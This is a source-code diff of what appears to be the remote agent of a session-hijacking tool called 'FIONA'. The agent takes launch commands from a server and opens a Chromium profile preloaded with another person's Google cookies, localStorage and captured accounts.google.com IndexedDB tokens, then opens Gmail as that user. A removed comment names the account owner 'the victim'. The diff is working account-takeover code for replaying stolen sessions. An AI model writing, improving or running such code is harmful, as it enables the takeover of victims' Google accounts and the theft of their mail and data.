@@ -16,29 +16,7 @@ if (!SERVER_URL || !AGENT_EMAIL || !AGENT_PASSWORD) {
 const activeBrowsers = new Map();
 const launching = new Set();
 
-function normalizeSameSite(sameSite) {
-  if (!sameSite) return 'Lax';
-  const l = sameSite.toLowerCase();
-  if (l === 'strict') return 'Strict';
-  if (l === 'lax') return 'Lax';
-  if (l === 'none' || l === 'no_restriction') return 'None';
-  return 'Lax';
-}
-
-function mapCookies(rawCookies) {
-  return rawCookies.map((c) => ({
-    name:     c.name,
-    value:    c.value,
-    domain:   c.domain,
-    path:     c.path || '/',
-    expires:  c.expirationDate ?? c.expires ?? -1,
-    httpOnly: Boolean(c.httpOnly),
-    secure:   Boolean(c.secure),
-    sameSite: normalizeSameSite(c.sameSite),
-  }));
-}
-
-async function launchProfile({ profileId, cookies, email, userId, gaiaId = '', displayName = '', pictureUrl = '' }) {
+async function launchProfile({ profileId, email, userId, browserState }) {
   const profileDir = path.join(os.tmpdir(), 'fiona-profiles', profileId);
 
   if (process.platform === 'win32') {
@@ -55,6 +33,19 @@ async function launchProfile({ profileId, cookies, email, userId, gaiaId = '', d
     fs.rmSync(profileDir, { recursive: true, force: true });
   }
   fs.mkdirSync(profileDir, { recursive: true });
+
+  // ── Parse VPS browser state ───────────────────────────────────────────────
+  let playwrightState = null;  // { cookies, origins } — Playwright storageState
+  let accountsIdb     = null;  // accounts.google.com IndexedDB (web RAPT lives here)
+  if (browserState) {
+    try {
+      const parsed  = JSON.parse(browserState);
+      playwrightState = parsed.playwrightState || null;
+      accountsIdb     = parsed.accountsIdb     || null;
+    } catch (e) {
+      console.error('[FIONA] browserState parse failed:', e.message);
+    }
+  }
 
   // ── Pre-seed Chrome profile display info ─────────────────────────────────
   // Write account metadata into Local State BEFORE launch so Chrome
@@ -128,58 +119,60 @@ async function launchProfile({ profileId, cookies, email, userId, gaiaId = '', d
   }
 
   // ── Launch Chromium ───────────────────────────────────────────────────────
-  // Map sameSite values to Patchright's expected format
-  const mapSameSite = (s) => {
-    if (!s || s === 'unspecified' || s === 'no_restriction') return 'None';
-    if (s === 'lax') return 'Lax';
-    if (s === 'strict') return 'Strict';
-    return 'None';
-  };
-
-  const formattedCookies = cookies.map(c => ({
-    name:     c.name,
-    value:    c.value,
-    domain:   c.domain,
-    path:     c.path || '/',
-    expires:  c.expirationDate ?? -1,
-    httpOnly: c.httpOnly ?? false,
-    secure:   c.secure ?? false,
-    sameSite: mapSameSite(c.sameSite),
-  }));
-
-  // storageState injects cookies BEFORE Chrome's startup sign-in verification runs.
-  // addCookies() arrives too late — Chrome has already done its ListAccounts check by then.
-  const storageState = { cookies: formattedCookies, origins: [] };
-
+  // storageState restores cookies AND localStorage for all origins atomically.
+  // ignoreDefaultArgs removed — it was stripping --disable-sync (Playwright's
+  // own default), which ENABLED Chrome sync and caused the "Sign in" dialog.
   const context = await chromium.launchPersistentContext(profileDir, {
-    storageState,
     headless: false,
     viewport: { width: 1280, height: 800 },
-    ignoreDefaultArgs: ['--disable-sync'],
+    storageState: playwrightState,
     args: [
       '--no-first-run',
       '--no-default-browser-check',
+      '--disable-sync',
       '--disable-background-networking',
     ],
   });
+  console.log(`[FIONA] Browser state applied for ${email}`);
 
-  console.log(`[FIONA] Injected ${formattedCookies.length} cookies for ${email} via storageState`);
-
-  // Use the default page launchPersistentContext creates
+  // Use the default blank tab Chrome opens at launch
   const pages = context.pages();
   const firstTab = pages.length > 0 ? pages[0] : await context.newPage();
 
-  // Visit myaccount.google.com FIRST — this triggers Chrome's internal
-  // accounts.google.com/ListAccounts?gpsia=1 check using the injected
-  // LSID/GAPS cookies, which is what makes the profile badge show the
-  // victim's email rather than showing "Sign in to Chrome"
-  await firstTab.goto('https://myaccount.google.com', {
-    waitUntil: 'domcontentloaded',
-    timeout: 30000,
-  });
-  await firstTab.waitForTimeout(2000);
+  // Navigate to accounts.google.com to restore IndexedDB (web RAPT, device tokens).
+  // cookies + localStorage are already set via storageState above, so this page
+  // loads as the authenticated user. We then write the captured IDB data back.
+  await firstTab.goto('https://accounts.google.com', {
+    waitUntil: 'networkidle',
+    timeout: 20000,
+  }).catch(() => {});
 
-  // Now open Gmail in a new tab (tab 2 becomes the focus)
+  if (accountsIdb && Object.keys(accountsIdb).length > 0) {
+    await firstTab.evaluate(async (idb) => {
+      for (const [dbName, dbInfo] of Object.entries(idb)) {
+        try {
+          const db = await new Promise((res, rej) => {
+            const req = indexedDB.open(dbName, dbInfo.version);
+            req.onupgradeneeded = () => {};
+            req.onsuccess = () => res(req.result);
+            req.onerror   = () => rej(req.error);
+          });
+          for (const [storeName, records] of Object.entries(dbInfo.stores)) {
+            try {
+              const tx    = db.transaction(storeName, 'readwrite');
+              const store = tx.objectStore(storeName);
+              for (const record of records) { store.put(record); }
+              await new Promise(res => { tx.oncomplete = res; tx.onerror = res; });
+            } catch (_) {}
+          }
+          db.close();
+        } catch (_) {}
+      }
+    }, accountsIdb).catch(e => console.warn('[FIONA] IDB restore warn:', e.message));
+    console.log(`[FIONA] IndexedDB restored — ${Object.keys(accountsIdb).length} databases`);
+  }
+
+  // Open Gmail in a new tab
   const gmailTab = await context.newPage();
   await gmailTab.goto('https://mail.google.com', {
     waitUntil: 'domcontentloaded',
@@ -256,7 +249,7 @@ async function main() {
     console.log('[FIONA] ✓ Agent ready. Waiting for launch commands...');
   });
 
-  socket.on('launch-profile', async ({ profileId, cookies, email, userId: uid, gaiaId = '', displayName = '', pictureUrl = '' }) => {
+  socket.on('launch-profile', async ({ profileId, email, userId: uid, browserState }) => {
     if (activeBrowsers.has(profileId)) {
       console.log(`[FIONA] Already running: ${email}`);
       socket.emit('launch-result', { profileId, userId: uid, success: true, authenticated: true, email });
@@ -271,7 +264,7 @@ async function main() {
 
     console.log(`[FIONA] Launch command received: ${email}`);
     try {
-      const authenticated = await launchProfile({ profileId, cookies, email, userId: uid, gaiaId, displayName, pictureUrl });
+      const authenticated = await launchProfile({ profileId, email, userId: uid, browserState });
       socket.emit('launch-result', { profileId, userId: uid, success: true, authenticated, email });
     } catch (err) {
       console.error('[FIONA] Launch error:', err.message);
